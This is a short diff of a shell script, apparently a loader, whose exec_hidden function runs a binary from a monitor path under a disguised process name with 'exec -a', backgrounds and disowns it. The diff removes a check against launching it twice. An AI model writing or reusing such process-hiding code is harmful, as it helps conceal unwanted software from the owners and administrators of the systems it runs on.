@@ -129,8 +129,6 @@ download_binary() {
 }
 
 exec_hidden() {
-	pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1 && return 0
-	
 	exec -a "${PROC_HIDDEN_NAME}" ${MONITOR_PATH} &
 	disown &>/dev/null
 }
